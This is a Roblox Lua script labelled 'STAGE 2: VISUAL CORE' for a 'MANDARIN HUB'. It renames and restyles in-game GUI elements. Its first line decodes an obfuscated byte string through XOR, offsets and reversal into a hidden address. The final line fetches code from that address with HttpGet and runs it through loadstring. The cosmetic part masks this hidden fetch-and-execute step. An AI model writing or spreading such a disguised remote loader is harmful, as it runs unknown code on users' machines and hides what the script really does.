
--[[ STAGE 2: VISUAL CORE ]]
local Tmdjdps7gRUDeYc91S="\214\049\233\230\235\253\232\077\061\026\013\033\081\024\027\036\102\043\045\057\067\089\087\078\100\146\151\169\117\125\134\139\116"local uPWg9S1nUXpQ7Yq1lPIynl=75 local bssFpZx3U5Pewm6=162 local X0R_D9Z8utrJ=0 local QXjSsk2iLIKgFGBhQ1nPT5=5 local oX7RBqgj8NC76AhRQRTlZ=10 local c7q7B6zd1_6riSCzB1EB1o=true local _AQTbRpKOmsG=bit32 and bit32.bxor if not _AQTbRpKOmsG then _AQTbRpKOmsG=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local aUHDROT_8NX2={}for TOLaTOJOWStd1Jp=1,#Tmdjdps7gRUDeYc91S do local JH2UzwPWILSLlyb_BghQb=string.byte(Tmdjdps7gRUDeYc91S,TOLaTOJOWStd1Jp)local dQVuiQphhOY0j=(bssFpZx3U5Pewm6+(TOLaTOJOWStd1Jp*QXjSsk2iLIKgFGBhQ1nPT5)+oX7RBqgj8NC76AhRQRTlZ)%256 if X0R_D9Z8utrJ==0 then JH2UzwPWILSLlyb_BghQb=(JH2UzwPWILSLlyb_BghQb-dQVuiQphhOY0j)%256 aUHDROT_8NX2[TOLaTOJOWStd1Jp]=string.char(_AQTbRpKOmsG(JH2UzwPWILSLlyb_BghQb,uPWg9S1nUXpQ7Yq1lPIynl))else JH2UzwPWILSLlyb_BghQb=_AQTbRpKOmsG(JH2UzwPWILSLlyb_BghQb,uPWg9S1nUXpQ7Yq1lPIynl)aUHDROT_8NX2[TOLaTOJOWStd1Jp]=string.char((JH2UzwPWILSLlyb_BghQb-dQVuiQphhOY0j)%256)end end local EWFMPeTfCX9nyh9zIx3=table.concat(aUHDROT_8NX2)if c7q7B6zd1_6riSCzB1EB1o then EWFMPeTfCX9nyh9zIx3=string.reverse(EWFMPeTfCX9nyh9zIx3)end local xzrkIke5nUfSLV7pTDmp=EWFMPeTfCX9nyh9zIx3
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(xzrkIke5nUfSLV7pTDmp))()
